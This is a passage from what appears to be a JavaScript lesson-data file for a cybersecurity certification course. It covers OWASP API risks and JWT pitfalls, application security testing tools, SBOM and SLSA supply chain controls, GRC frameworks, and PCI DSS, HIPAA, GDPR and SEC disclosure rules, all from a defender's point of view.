<tr><td>API6</td><td>Unrestricted Access to Sensitive Business Flows</td><td>Bots buying all concert tickets or abusing a referral bonus flow</td></tr>
<tr><td>API7</td><td>Server Side Request Forgery</td><td>A "webhook URL" parameter used to reach internal services or cloud metadata</td></tr>
<tr><td>API8</td><td>Security Misconfiguration</td><td>Permissive CORS, verbose stack traces, missing TLS, unpatched gateway</td></tr>
<tr><td>API9</td><td>Improper Inventory Management</td><td>Forgotten /api/v1 still live and unpatched while /api/v3 is protected ("shadow" and "zombie" APIs)</td></tr>
<tr><td>API10</td><td>Unsafe Consumption of APIs</td><td>Blindly trusting data returned by a third-party API</td></tr>
</tbody>
</table>

<div class="callout tip"><strong>Remember the three authorization levels:</strong> <strong>Object</strong> (which record? BOLA), <strong>Property</strong> (which fields of the record? BOPLA), and <strong>Function</strong> (which operation? BFLA). Most serious API breaches are authorization failures, not exotic exploits.</div>

<h3>How APIs authenticate</h3>
<ul>
<li><strong>API keys</strong>: a static secret identifying the calling application. Easy to leak in mobile apps and repos; identifies an app, not a user.</li>
<li><strong>OAuth 2.0 access tokens</strong>: issued by an authorization server, scoped and short-lived. OAuth 2.1 consolidates best practice (PKCE everywhere, no implicit grant).</li>
<li><strong>JSON Web Tokens (JWT)</strong>: a common token format with three base64url parts: header.payload.signature. The payload is readable by anyone; only the signature protects integrity.</li>
<li><strong>Mutual TLS</strong>: both client and server present certificates, common for service-to-service and banking APIs.</li>
</ul>
<pre><code>Header:  {"alg":"RS256","typ":"JWT"}
Payload: {"sub":"user381","scope":"orders:read","exp":1792000000,"iss":"https://login.example.com"}</code></pre>

<div class="callout warn"><strong>JWT pitfalls:</strong> accepting "alg":"none"; confusing RS256 and HS256 so the public key is used as an HMAC secret; not validating exp, iss and aud; and putting sensitive data in the payload, which is only encoded, not encrypted.</div>

<h3>Defensive controls</h3>
<table>
<thead><tr><th>Control</th><th>Addresses</th></tr></thead>
<tbody>
<tr><td>Object-level authorization check in every handler ("does this user own order 10443?")</td><td>API1</td></tr>
<tr><td>Response schemas and allow-listed fields; never bind request bodies directly to database models</td><td>API3</td></tr>
<tr><td>API gateway with rate limits, quotas and payload size limits</td><td>API2, API4, API6</td></tr>
<tr><td>Central policy for role checks on admin routes</td><td>API5</td></tr>
<tr><td>Egress allow-lists for outbound fetches; block metadata IPs</td><td>API7</td></tr>
<tr><td>API discovery and an inventory tied to OpenAPI specifications; retire old versions</td><td>API9</td></tr>
<tr><td>Validate and sanitize third-party responses; TLS to partners</td><td>API10</td></tr>
</tbody>
</table>

<div class="callout real"><strong>Real-world pattern:</strong> Several large breaches of telecom and social platforms involved an unauthenticated or weakly authorized API endpoint that returned customer records by incrementing an ID. Attackers scripted millions of requests. Detection signals: a single client or token touching an unusually high number of distinct object IDs, sequential ID access, and high 200-response rates on endpoints that normally see light traffic.</div>

<div class="callout exam"><strong>CISSP Domain 8:</strong> APIs fall under "assess the security impact of acquired software" and secure coding. Know that APIs must authenticate, authorize, validate input, rate-limit and log, and that an inventory of interfaces is part of asset management.</div>
`,
  keyTerms: [
    ["BOLA", "Broken Object Level Authorization: accessing objects belonging to other users via the API"],
    ["BFLA", "Broken Function Level Authorization: calling privileged API functions without the right role"],
    ["Mass assignment", "Binding client-supplied fields directly to internal objects, allowing unauthorized property changes"],
    ["JWT", "JSON Web Token: signed, base64url-encoded claims used as a bearer token"],
    ["API gateway", "Central entry point that enforces authentication, rate limits and routing for APIs"],
    ["Shadow API", "An undocumented API endpoint unknown to security teams"]
  ],
  standards: ["OWASP API Security Top 10 2023", "RFC 6749", "RFC 7519", "RFC 9700"],
  labs: ["lab-owasp-web"]
},
{
  id: "p4-m2-l3",
  module: "p4-m2",
  title: "Testing Software: SAST, DAST, IAST and SCA",
  minutes: 16,
  objectives: [
    "Compare SAST, DAST, IAST, SCA and secret scanning",
    "Place each tool in a DevSecOps pipeline",
    "Prioritize findings using CVSS, EPSS and KEV",
    "Explain false positives and how to triage them"
  ],
  html: `
<p>No single technique finds every flaw. Mature teams layer several automated tests into the CI/CD pipeline and back them with manual review and penetration testing. As an analyst or junior AppSec engineer, you will often triage the output of these tools.</p>

<h3>The testing toolbox</h3>
<table>
<thead><tr><th>Technique</th><th>How it works</th><th>Strengths</th><th>Weaknesses</th><th>Examples</th></tr></thead>
<tbody>
<tr><td>SAST (static)</td><td>Analyzes source code or bytecode without running it ("white box")</td><td>Runs early, points to the exact line</td><td>Many false positives; misses runtime and config issues</td><td>Semgrep, CodeQL, SonarQube, Checkmarx</td></tr>
<tr><td>DAST (dynamic)</td><td>Attacks the running application from outside ("black box")</td><td>Finds real exploitable behavior, language-agnostic</td><td>Runs late, cannot see code paths it does not reach</td><td>OWASP ZAP, Burp Suite, Nuclei</td></tr>
<tr><td>IAST (interactive)</td><td>Agent inside the running app observes data flow during tests</td><td>Accurate, low false positives</td><td>Language-specific agents, needs good test coverage</td><td>Contrast, Seeker</td></tr>
<tr><td>SCA (composition)</td><td>Inventories open-source dependencies and matches them to known CVEs and licenses</td><td>Huge coverage: most code is third-party</td><td>Flags vulnerable libraries even when the vulnerable function is unused (reachability helps)</td><td>Dependabot, Snyk, OWASP Dependency-Check, Grype</td></tr>
<tr><td>Secret scanning</td><td>Searches commits for keys, tokens and passwords</td><td>Catches the most common cloud breach cause</td><td>Must also scan history, not just the latest commit</td><td>GitHub secret scanning, Gitleaks, TruffleHog</td></tr>
<tr><td>IaC scanning</td><td>Checks Terraform, CloudFormation and Kubernetes manifests</td><td>Prevents misconfigurations before deployment</td><td>Only as good as its policies</td><td>Checkov, Trivy, KICS</td></tr>
<tr><td>Fuzzing</td><td>Feeds malformed or random input to find crashes</td><td>Finds memory corruption and edge cases</td><td>Needs time and instrumentation</td><td>AFL++, libFuzzer, OSS-Fuzz</td></tr>
</tbody>
</table>

<h3>Where they fit in the pipeline</h3>
<ol>
<li><strong>Developer IDE / pre-commit</strong>: linters, lightweight SAST, secret scanning hooks.</li>
<li><strong>Pull request</strong>: SAST, SCA, IaC and secret scanning; block merges on critical findings.</li>
<li><strong>Build</strong>: container image scanning, SBOM generation, artifact signing.</li>
<li><strong>Test / staging</strong>: DAST and IAST against a deployed instance.</li>
<li><strong>Production</strong>: runtime protection, WAF, continuous SCA monitoring for newly published CVEs, bug bounty.</li>
</ol>
<p>This is what "shift left" means: catch issues as early as possible because fixing a bug in design or code review costs a fraction of fixing it after a breach. "Shift right" complements it with production monitoring.</p>

<h3>Prioritizing findings</h3>
<p>A typical SCA scan of a mid-sized app reports hundreds of CVEs. You cannot fix them all at once, so combine signals:</p>
<ul>
<li><strong>CVSS</strong> (v3.1 and v4.0): technical severity from 0 to 10. Severity is not risk.</li>
<li><strong>EPSS</strong> (Exploit Prediction Scoring System from FIRST): probability that a CVE will be exploited in the next 30 days.</li>
<li><strong>CISA KEV</strong> (Known Exploited Vulnerabilities catalog): confirmed exploitation in the wild. KEV entries go to the top of the list.</li>
<li><strong>Context</strong>: is the component reachable, internet-facing, processing sensitive data?</li>
</ul>

<div class="callout real"><strong>On the job:</strong> When Log4Shell (CVE-2021-44228) broke, organizations with an up-to-date SCA inventory or SBOM answered "where are we running log4j-core?" in hours. Others spent weeks grepping servers. Inventory is a security control.</div>

<h3>Triaging a SAST finding</h3>
<p>For each finding, ask: Is the source actually attacker-controlled? Is there sanitization the tool did not recognize? Is the sink actually dangerous? Mark true positives with a severity and a fix suggestion, and record false positives with a justification so the rule can be tuned. Developers stop trusting tools that cry wolf, so tuning is part of the job.</p>

<div class="callout warn">Do not let automated tools replace threat modeling and manual review. Business logic flaws such as "a user can apply the same discount code unlimited times" are invisible to scanners.</div>

<div class="callout exam"><strong>CISSP Domain 6 and Domain 8:</strong> Know static vs dynamic testing, fuzzing (mutation/dumb vs generation/smart), code review, and misuse case testing. Static testing does not execute code; dynamic testing does.</div>
`,
  keyTerms: [
    ["SAST", "Static Application Security Testing: analyzing code without executing it"],
    ["DAST", "Dynamic Application Security Testing: testing the running application from outside"],
    ["SCA", "Software Composition Analysis: identifying third-party components and their known vulnerabilities"],
    ["EPSS", "FIRST's probability score that a vulnerability will be exploited soon"],
    ["CISA KEV", "Catalog of vulnerabilities known to be exploited in the wild"],
    ["Shift left", "Moving security testing earlier in the development lifecycle"]
  ],
  standards: ["NIST SP 800-218 (SSDF)", "CVSS v4.0", "OWASP DevSecOps Guideline"],
  labs: ["lab-cvss"]
},
{
  id: "p4-m2-l4",
  module: "p4-m2",
  title: "Software Supply Chain Security: SBOM and SLSA",
  minutes: 16,
  objectives: [
    "Explain why software supply chain attacks are so damaging",
    "Describe SBOM formats and minimum elements",
    "Summarize SLSA build levels and provenance",
    "List practical controls for dependencies and CI/CD pipelines"
  ],
  html: `
<p>A supply chain attack compromises a trusted supplier so that the victim installs the malware themselves. One successful attack can reach thousands of organizations, which is why it earned its own category (A03) in the OWASP Top 10:2025.</p>

<h3>Landmark incidents</h3>
<table>
<thead><tr><th>Incident</th><th>Year</th><th>What happened</th></tr></thead>
<tbody>
<tr><td>SolarWinds Orion (SUNBURST)</td><td>2020</td><td>Attackers compromised the build system and inserted a backdoor into signed updates delivered to about 18,000 customers</td></tr>
<tr><td>Codecov</td><td>2021</td><td>Modified bash uploader script exfiltrated CI environment secrets</td></tr>
<tr><td>Log4Shell</td><td>2021</td><td>Not malicious insertion, but a critical flaw in a ubiquitous dependency showed how few organizations knew what they ran</td></tr>
<tr><td>3CX</td><td>2023</td><td>A supply chain compromise that itself began with another trojanized software package</td></tr>
<tr><td>XZ Utils backdoor (CVE-2024-3094)</td><td>2024</td><td>A contributor spent about two years gaining maintainer trust before planting a backdoor targeting SSH; caught by a Microsoft engineer noticing a 500 ms delay</td></tr>
<tr><td>npm and PyPI malicious packages and worms</td><td>Ongoing</td><td>Typosquatting, dependency confusion, hijacked maintainer accounts and self-propagating malware in package ecosystems</td></tr>
</tbody>
</table>

<h3>Software Bill of Materials (SBOM)</h3>
<p>An SBOM is a machine-readable ingredients list of a piece of software: every component, version, supplier and dependency relationship. U.S. Executive Order 14028 (2021) pushed SBOMs into federal procurement, and the EU Cyber Resilience Act requires manufacturers to maintain them for products with digital elements.</p>
<ul>
<li><strong>Formats</strong>: <strong>SPDX</strong> (Linux Foundation, also ISO/IEC 5962) and <strong>CycloneDX</strong> (OWASP, also standardized as ECMA-424). Both are JSON or XML.</li>
<li><strong>Minimum elements</strong> (originally from NTIA, now maintained by CISA): supplier, component name, version, unique identifier (such as a package URL or CPE), dependency relationship, SBOM author, and timestamp.</li>
<li><strong>VEX</strong> (Vulnerability Exploitability eXchange) documents accompany SBOMs to state whether a listed CVE actually affects the product ("not affected: vulnerable code not present").</li>
</ul>
<pre><code>{
  "bomFormat": "CycloneDX",
  "specVersion": "1.6",
  "components": [
    { "type": "library", "name": "log4j-core", "version": "2.17.1",
      "purl": "pkg:maven/org.apache.logging.log4j/log4j-core@2.17.1" }
  ]
}</code></pre>

<h3>SLSA: Supply-chain Levels for Software Artifacts</h3>
<p>SLSA (pronounced "salsa") is an OpenSSF framework for build integrity. Its Build track defines increasing assurance about how an artifact was produced:</p>
<table>
<thead><tr><th>Level</th><th>Requirement</th><th>What it protects against</th></tr></thead>
<tbody>
<tr><td>Build L0</td><td>No guarantees</td><td>Nothing</td></tr>
<tr><td>Build L1</td><td>Provenance exists showing how the package was built</td><td>Mistakes; enables inventory</td></tr>
<tr><td>Build L2</td><td>Hosted build platform generates and signs the provenance</td><td>Tampering after the build</td></tr>
<tr><td>Build L3</td><td>Hardened build platform isolates builds and protects signing keys from user-defined build steps</td><td>Tampering during the build, as in SolarWinds</td></tr>
</tbody>
</table>
<p><strong>Provenance</strong> is a signed attestation recording the source repository, commit, build platform and parameters. Tools like Sigstore (cosign, Fulcio, Rekor) make signing and verifying artifacts practical without managing long-lived keys.</p>

<h3>Practical controls</h3>
<ul>
<li>Pin dependency versions and use lock files; verify hashes.</li>
<li>Use a private registry or proxy and protect internal package names to prevent dependency confusion.</li>
<li>Require MFA and signed commits for maintainers; protect branches with mandatory reviews.</li>
<li>Treat CI/CD as production: least-privilege runners, short-lived OIDC tokens to the cloud instead of stored keys, isolated build environments.</li>
<li>Generate SBOMs on every build and monitor them for new CVEs.</li>
<li>Check project health with OpenSSF Scorecard before adopting a library.</li>
<li>Follow the NIST Secure Software Development Framework (SSDF, SP 800-218) and request self-attestation from suppliers.</li>
</ul>

<div class="callout warn"><strong>Signed does not mean safe.</strong> SUNBURST was signed with SolarWinds' legitimate certificate because the build itself was compromised. Signatures prove origin and integrity after signing, not the absence of malice before it. That is why SLSA focuses on the build process.</div>

<div class="callout real"><strong>On the job:</strong> When a new malicious package advisory drops, the SOC question is "did any of our builds pull it?" Search build logs, artifact repositories and SBOMs for the package name and versions, then check endpoints and CI runners for the reported indicators.</div>

<div class="callout exam"><strong>CISSP Domain 8 and Domain 1:</strong> Supply chain risk management (SCRM) appears in Domain 1 (third parties, minimum security requirements) and Domain 8 (acquired software, software repositories). Know that verifying integrity and provenance of acquired software is a buyer responsibility.</div>
`,
  keyTerms: [
    ["Supply chain attack", "Compromising a trusted vendor or component to reach downstream victims"],
    ["SBOM", "Software Bill of Materials: machine-readable list of software components and dependencies"],
    ["SPDX / CycloneDX", "The two dominant SBOM standards"],
    ["VEX", "Statement of whether a known vulnerability actually affects a product"],
    ["SLSA", "OpenSSF framework of levels for build integrity and provenance"],
    ["Dependency confusion", "Tricking a build into pulling a public package that shadows an internal package name"]
  ],
  standards: ["SLSA v1.0", "NIST SP 800-218", "NIST SP 800-161 Rev 1", "ISO/IEC 5962:2021", "Executive Order 14028"]
}
);

/* ===================== p4-m3 Governance, Risk & Compliance ===================== */
CP.lessons.push(
{
  id: "p4-m3-l1",
  module: "p4-m3",
  title: "GRC Foundations, NIST CSF 2.0 and CIS Controls v8.1",
  minutes: 18,
  objectives: [
    "Define governance, risk management and compliance and how they relate",
    "Describe the six functions of NIST CSF 2.0 including Govern",
    "Use CSF Profiles and Tiers to describe current and target state",
    "Explain CIS Controls v8.1 and Implementation Groups"
  ],
  html: `
<p>Technical analysts sometimes treat GRC as paperwork. In reality GRC decides which controls exist, how much budget the SOC gets, and what "good" looks like. It is also a full career path, and the CISSP is heavily GRC-flavored.</p>

<h3>The three letters</h3>
<ul>
<li><strong>Governance</strong>: how leadership sets direction and holds people accountable. Policies, roles, a security strategy aligned to business goals, and oversight by the board.</li>
<li><strong>Risk management</strong>: identifying, analyzing, and treating risks so that residual risk stays within the organization's <em>risk appetite</em>.</li>
<li><strong>Compliance</strong>: demonstrating conformance with laws, regulations, contracts and internal policies, usually through evidence and audits.</li>
</ul>
<p>Key relationship: <strong>compliance is not security</strong>. A company can pass an audit and still be breached, because standards set a floor. Good GRC uses frameworks as a structure for real risk reduction.</p>

<h3>Policy hierarchy</h3>
<table>
<thead><tr><th>Document</th><th>Mandatory?</th><th>Example</th></tr></thead>
<tbody>
<tr><td>Policy</td><td>Yes, high level, approved by leadership</td><td>"All remote access must use MFA."</td></tr>
<tr><td>Standard</td><td>Yes, specific and measurable</td><td>"MFA must use FIDO2 or number-matching push."</td></tr>
<tr><td>Procedure</td><td>Yes, step by step</td><td>"How to enroll a YubiKey in Entra ID."</td></tr>
<tr><td>Guideline</td><td>No, recommended practice</td><td>"Consider using a passkey on your phone."</td></tr>
<tr><td>Baseline</td><td>Yes, minimum configuration</td><td>CIS Benchmark Level 1 for Windows 11</td></tr>
</tbody>
</table>

<h3>NIST Cybersecurity Framework 2.0</h3>
<p>Released in February 2024 as NIST CSWP 29, CSF 2.0 expanded the original framework's audience from critical infrastructure to <strong>all organizations</strong> and added a sixth function, <strong>Govern</strong>, which sits at the center of the wheel and informs the other five.</p>
<table>
<thead><tr><th>Function</th><th>Question it answers</th><th>Example categories</th></tr></thead>
<tbody>
<tr><td>Govern (GV)</td><td>How do we set and oversee our cybersecurity strategy?</td><td>Organizational Context, Risk Management Strategy, Roles and Responsibilities, Policy, Oversight, Cybersecurity Supply Chain Risk Management</td></tr>
<tr><td>Identify (ID)</td><td>What do we have and what are the risks?</td><td>Asset Management, Risk Assessment, Improvement</td></tr>
<tr><td>Protect (PR)</td><td>How do we prevent or limit impact?</td><td>Identity Management and Access Control, Awareness and Training, Data Security, Platform Security, Technology Infrastructure Resilience</td></tr>
<tr><td>Detect (DE)</td><td>How do we find attacks?</td><td>Continuous Monitoring, Adverse Event Analysis</td></tr>
<tr><td>Respond (RS)</td><td>What do we do about a detected incident?</td><td>Incident Management, Analysis, Reporting and Communication, Mitigation</td></tr>
<tr><td>Recover (RC)</td><td>How do we restore operations?</td><td>Incident Recovery Plan Execution, Communication</td></tr>
</tbody>
</table>
<p>The structure is Functions, then Categories, then Subcategories (outcomes such as "DE.CM-01: Networks and network services are monitored to find potentially adverse events"). CSF 2.0 also ships Implementation Examples, Quick-Start Guides, and online Informative References mapping to SP 800-53, ISO 27001 and CIS Controls.</p>
<ul>
<li><strong>Organizational Profiles</strong>: a <em>Current Profile</em> describes outcomes you achieve today; a <em>Target Profile</em> describes where you want to be. The gap becomes your roadmap.</li>
<li><strong>Tiers</strong>: 1 Partial, 2 Risk Informed, 3 Repeatable, 4 Adaptive. Tiers describe the rigor of your risk governance and management, not a maturity score you must max out.</li>
</ul>

<div class="callout tip">The CSF is voluntary and outcome-based: it says <em>what</em> to achieve, not <em>how</em>. That is why it pairs well with prescriptive catalogs such as SP 800-53 or the CIS Controls.</div>

<h3>CIS Critical Security Controls v8.1</h3>
<p>The Center for Internet Security publishes 18 prioritized controls containing 153 safeguards. Version 8.1 (2024) aligned with CSF 2.0 by adding a Govern security function to safeguards and refining definitions. The first controls are the most foundational:</p>
<ol>
<li>Inventory and Control of Enterprise Assets</li>
<li>Inventory and Control of Software Assets</li>
<li>Data Protection</li>
<li>Secure Configuration of Enterprise Assets and Software</li>
<li>Account Management</li>
<li>Access Control Management</li>
<li>Continuous Vulnerability Management</li>
<li>Audit Log Management</li>
</ol>
<p>The remaining controls cover email and browser protections, malware defenses, data recovery, network infrastructure management, network monitoring and defense, security awareness training, service provider management, application software security, incident response management, and penetration testing.</p>
<p><strong>Implementation Groups</strong> help prioritize: <strong>IG1</strong> (56 safeguards) is "essential cyber hygiene" for every organization; <strong>IG2</strong> adds safeguards for organizations with more complexity and sensitive data; <strong>IG3</strong> covers all 153 for organizations facing sophisticated attackers.</p>

<div class="callout real"><strong>On the job:</strong> Small and mid-sized companies often start with CIS IG1 because it is concrete ("maintain a detailed asset inventory, update at least twice a year"), then report progress to leadership using CSF functions because executives understand the six-word story.</div>

<div class="callout exam"><strong>CISSP Domain 1:</strong> Know the policy hierarchy (policies are mandatory and high level; guidelines are optional), that senior management is ultimately accountable for security, and the purpose of frameworks. Expect CSF 2.0's six functions, especially that Govern is new.</div>
`,
  keyTerms: [
    ["Governance", "Leadership direction, accountability and oversight of security"],
    ["Risk appetite", "The amount and type of risk an organization is willing to pursue or retain"],
    ["NIST CSF 2.0", "Outcome-based framework with six functions: Govern, Identify, Protect, Detect, Respond, Recover"],
    ["Organizational Profile", "CSF description of current or target cybersecurity outcomes"],
    ["CSF Tier", "Rigor of risk governance and management: Partial, Risk Informed, Repeatable, Adaptive"],
    ["CIS Implementation Group", "Prioritized subsets of CIS safeguards; IG1 is essential cyber hygiene"]
  ],
  standards: ["NIST CSWP 29 (CSF 2.0)", "CIS Controls v8.1"]
},
{
  id: "p4-m3-l2",
  module: "p4-m3",
  title: "Control Frameworks and Audits: NIST RMF, SP 800-53, ISO 27001 and SOC 2",
  minutes: 20,
  objectives: [
    "List the seven steps of the NIST Risk Management Framework",
    "Describe SP 800-53 Rev 5 control families and baselines",
    "Explain ISO/IEC 27001:2022 clauses and Annex A themes",
    "Distinguish SOC 1, SOC 2 Type I, SOC 2 Type II and SOC 3"
  ],
  html: `
<p>Frameworks give organizations a common language for controls. You will meet the U.S. government's NIST family, the international ISO 27000 family, and the SOC reports that service providers hand to customers.</p>

<h3>NIST Risk Management Framework (SP 800-37 Rev 2)</h3>
<p>The RMF is mandatory for U.S. federal systems under FISMA and widely used by contractors. Its seven steps:</p>
<ol>
<li><strong>Prepare</strong>: establish context, roles, risk strategy and common controls.</li>
<li><strong>Categorize</strong>: determine impact (Low, Moderate, High) for confidentiality, integrity and availability using FIPS 199 and SP 800-60. The system's overall category is the high-water mark.</li>
<li><strong>Select</strong>: choose an SP 800-53B control baseline and tailor it.</li>
<li><strong>Implement</strong>: deploy controls and document them in the System Security Plan (SSP).</li>
<li><strong>Assess</strong>: an independent assessor tests controls using SP 800-53A procedures and writes a Security Assessment Report.</li>
<li><strong>Authorize</strong>: a senior official, the Authorizing Official, accepts residual risk and issues an Authorization to Operate (ATO). Open weaknesses go in the Plan of Action and Milestones (POA&amp;M).</li>
<li><strong>Monitor</strong>: continuous monitoring, ongoing assessments and reauthorization when needed.</li>
</ol>
<div class="callout tip">Memory aid: "<strong>P</strong>eople <strong>C</strong>an't <strong>S</strong>tand <strong>I</strong>nept <strong>A</strong>uditors <strong>A</strong>ll <strong>M</strong>onth."</div>

<h3>SP 800-53 Rev 5</h3>
<p>SP 800-53 is the comprehensive catalog of security and privacy controls, organized into <strong>20 families</strong> such as AC (Access Control), AU (Audit and Accountability), CM (Configuration Management), IA (Identification and Authentication), IR (Incident Response), RA (Risk Assessment), SC (System and Communications Protection), SI (System and Information Integrity), SR (Supply Chain Risk Management, new in Rev 5) and PT (PII Processing and Transparency, also new). Rev 5 made controls outcome-based and usable by any organization, not just federal agencies. Baselines (Low, Moderate, High, plus a Privacy baseline) live in SP 800-53B. FedRAMP, the cloud authorization program, is built on these baselines.</p>

<h3>ISO/IEC 27001:2022</h3>
<p>ISO 27001 specifies requirements for an <strong>Information Security Management System (ISMS)</strong>: a management process, not just a control list. Organizations can be <strong>certified</strong> by an accredited body. The transition period from the 2013 version ended October 31, 2025, so all valid certificates now reference the 2022 version.</p>
<ul>
<li><strong>Clauses 4 to 10</strong> are mandatory: Context, Leadership, Planning (including risk assessment and treatment), Support, Operation, Performance Evaluation (internal audit, management review) and Improvement. They follow Plan-Do-Check-Act.</li>
<li><strong>Annex A</strong> lists 93 controls in four themes: <strong>Organizational</strong> (37), <strong>People</strong> (8), <strong>Physical</strong> (14), and <strong>Technological</strong> (34). New 2022 controls include threat intelligence, cloud services security, ICT readiness for business continuity, data masking, data leakage prevention, monitoring activities, web filtering, and secure coding.</li>
<li>The <strong>Statement of Applicability (SoA)</strong> lists each Annex A control, whether it applies, and why.</li>
<li>ISO 27002:2022 gives implementation guidance for each control. ISO 27701 extends the ISMS to privacy.</li>
</ul>

<h3>SOC reports</h3>
<p>Under the AICPA's SSAE 18 attestation standards, a CPA firm examines a service organization and issues a report customers use for vendor risk management.</p>
<table>
<thead><tr><th>Report</th><th>Focus</th><th>Audience</th></tr></thead>
<tbody>
<tr><td>SOC 1</td><td>Controls relevant to customers' financial reporting (ICFR)</td><td>Customers' auditors, restricted use</td></tr>
<tr><td>SOC 2</td><td>Trust Services Criteria: Security (required, the "common criteria"), Availability, Processing Integrity, Confidentiality, Privacy</td><td>Customers and prospects under NDA</td></tr>
<tr><td>SOC 3</td><td>Same criteria as SOC 2 but a short general-use summary without test details</td><td>Public, marketing</td></tr>
</tbody>
</table>
<ul>
<li><strong>Type I</strong>: are controls suitably <em>designed</em> at a point in time?</li>
<li><strong>Type II</strong>: did controls <em>operate effectively</em> over a period, usually 6 to 12 months? Type II is far more valuable.</li>
</ul>

<div class="callout real"><strong>On the job:</strong> When reviewing a vendor's SOC 2 Type II, read the auditor's opinion (unqualified is clean; qualified means exceptions), the testing exceptions section, the scope (which systems and criteria), and the <strong>Complementary User Entity Controls (CUECs)</strong>: the things the vendor says <em>you</em> must do, such as enabling MFA for your users. Also check carved-out subservice organizations such as their cloud provider.</div>

<div class="callout warn">ISO 27001 is a <em>certification</em> of a management system; SOC 2 is an <em>attestation report</em> from a CPA. They overlap heavily but are not interchangeable in contracts.</div>

<div class="callout exam"><strong>CISSP Domain 1 and Domain 6:</strong> Know RMF step order, that the Authorizing Official accepts risk, high-water mark categorization, and that a SOC 2 Type II tests operating effectiveness over time while a SOC 3 is for public distribution.</div>
`,
  keyTerms: [
    ["NIST RMF", "Seven-step process: Prepare, Categorize, Select, Implement, Assess, Authorize, Monitor"],
    ["ATO", "Authorization to Operate: formal acceptance of residual risk by an Authorizing Official"],
    ["POA&M", "Plan of Action and Milestones tracking unresolved weaknesses"],
    ["ISMS", "Information Security Management System defined by ISO/IEC 27001"],
    ["Statement of Applicability", "ISO 27001 document justifying inclusion or exclusion of each Annex A control"],
    ["SOC 2 Type II", "CPA attestation that controls operated effectively over a period of time"]
  ],
  standards: ["NIST SP 800-37 Rev 2", "NIST SP 800-53 Rev 5", "NIST SP 800-53B", "FIPS 199", "ISO/IEC 27001:2022", "ISO/IEC 27002:2022", "AICPA SSAE 18"]
},
{
  id: "p4-m3-l3",
  module: "p4-m3",
  title: "Laws and Regulations: PCI DSS, HIPAA, GDPR and SEC Disclosure",
  minutes: 20,
  objectives: [
    "Summarize PCI DSS v4.0.1 requirements and scope",
    "Describe HIPAA rules and breach notification thresholds",
    "Explain GDPR principles, roles, rights and the 72-hour rule",
    "Describe the SEC cybersecurity disclosure rules for public companies"
  ],
  html: `
<p>Laws and contracts turn security from "nice to have" into "required, with penalties." As an analyst you need to know which rules apply to the data you protect, because they dictate logging, retention and how fast an incident must be reported.</p>

<h3>PCI DSS v4.0.1</h3>
<p>The Payment Card Industry Data Security Standard is a <strong>contractual</strong> standard from the PCI Security Standards Council, enforced by card brands and acquiring banks, not a law. Version 4.0.1 (June 2024) is the only active version; the future-dated requirements introduced in 4.0 became mandatory on <strong>March 31, 2025</strong>.</p>
<table>
<thead><tr><th>Goal</th><th>Requirements</th></tr></thead>
<tbody>
<tr><td>Build and maintain a secure network</td><td>1 Network security controls; 2 Secure configurations</td></tr>
<tr><td>Protect account data</td><td>3 Protect stored account data; 4 Strong cryptography in transit over open networks</td></tr>
<tr><td>Vulnerability management</td><td>5 Anti-malware; 6 Secure systems and software</td></tr>
<tr><td>Strong access control</td><td>7 Restrict access by need to know; 8 Identify users and authenticate (MFA for all access into the cardholder data environment); 9 Restrict physical access</td></tr>
<tr><td>Monitor and test</td><td>10 Log and monitor all access; 11 Test security regularly</td></tr>
<tr><td>Policy</td><td>12 Organizational policies and programs</td></tr>
</tbody>
</table>
<p>Scope is the <strong>Cardholder Data Environment (CDE)</strong>. Segmentation and tokenization shrink scope. The full card number (PAN) may be stored only if rendered unreadable; sensitive authentication data such as CVV2 must never be stored after authorization. Version 4 added a <strong>customized approach</strong> letting mature organizations meet objectives in their own way, plus requirements such as automated log review and protection against e-commerce script tampering (6.4.3 and 11.6.1).</p>

<h3>HIPAA</h3>
<p>The U.S. Health Insurance Portability and Accountability Act applies to <strong>covered entities</strong> (providers, health plans, clearinghouses) and their <strong>business associates</strong>, who sign a Business Associate Agreement (BAA). It protects Protected Health Information (PHI).</p>
<ul>
<li><strong>Privacy Rule</strong>: who may use and disclose PHI; minimum necessary standard.</li>
<li><strong>Security Rule</strong>: administrative, physical and technical safeguards for electronic PHI, starting with a risk analysis. HHS proposed a major update in January 2025 that would make most safeguards, including MFA and encryption, explicitly required; check its current status.</li>
<li><strong>Breach Notification Rule</strong>: notify affected individuals without unreasonable delay and no later than <strong>60 days</strong> after discovery. Breaches affecting <strong>500 or more</strong> people also require notice to HHS and prominent media within 60 days; smaller breaches are reported to HHS annually.</li>
<li>The HITECH Act strengthened penalties and extended obligations to business associates.</li>
</ul>

<h3>GDPR</h3>
<p>The EU General Data Protection Regulation applies to processing personal data of people in the EU, regardless of where the company is located (extraterritorial scope).</p>
<ul>
<li><strong>Roles</strong>: the <strong>controller</strong> decides why and how data is processed; the <strong>processor</strong> processes on the controller's behalf; the <strong>data subject</strong> is the person. Many organizations must appoint a Data Protection Officer (DPO).</li>
<li><strong>Principles</strong> (Article 5): lawfulness, fairness and transparency; purpose limitation; data minimization; accuracy; storage limitation; integrity and confidentiality; accountability.</li>
<li><strong>Six lawful bases</strong>: consent, contract, legal obligation, vital interests, public task, legitimate interests.</li>
<li><strong>Rights</strong>: access, rectification, erasure ("right to be forgotten"), restriction, portability, objection, and rights regarding automated decision-making.</li>
<li><strong>Breach notification</strong>: to the supervisory authority within <strong>72 hours</strong> of becoming aware, unless unlikely to result in risk; to individuals without undue delay when high risk.</li>
<li><strong>Fines</strong>: up to EUR 20 million or 4% of worldwide annual turnover, whichever is higher.</li>
<li>International transfers need a mechanism such as an adequacy decision (for example the EU-U.S. Data Privacy Framework) or Standard Contractual Clauses.</li>
</ul>

<h3>SEC cybersecurity disclosure rules</h3>
<p>Since December 2023, U.S. public companies must:</p>
<ul>
<li>Disclose a <strong>material</strong> cybersecurity incident on Form 8-K, Item 1.05, within <strong>four business days</strong> of determining it is material. The materiality determination itself must be made without unreasonable delay.</li>
<li>Describe annually in Form 10-K (Regulation S-K Item 106) their cyber risk management processes, the board's oversight, and management's expertise.</li>
</ul>

<div class="callout real"><strong>On the job:</strong> These clocks are why incident responders keep precise timelines. "When did we become aware?" starts the GDPR 72-hour clock. Your ticket notes and SIEM timestamps can become regulatory evidence, so write them carefully and factually. Other regimes have their own clocks, for example CIRCIA in the U.S., NIS2 in the EU (24-hour early warning) and state breach laws.</div>

<div class="callout exam"><strong>CISSP Domain 1:</strong> Know the difference between laws (criminal, civil, administrative/regulatory) and contractual standards like PCI DSS, the controller vs processor distinction, transborder data flow issues, and that privacy requirements follow the data subject.</div>
`,
  keyTerms: [
    ["PCI DSS", "Contractual card-industry standard with 12 requirements; current version 4.0.1"],
    ["CDE", "Cardholder Data Environment: systems that store, process or transmit card data"],
    ["PHI", "Protected Health Information under HIPAA"],
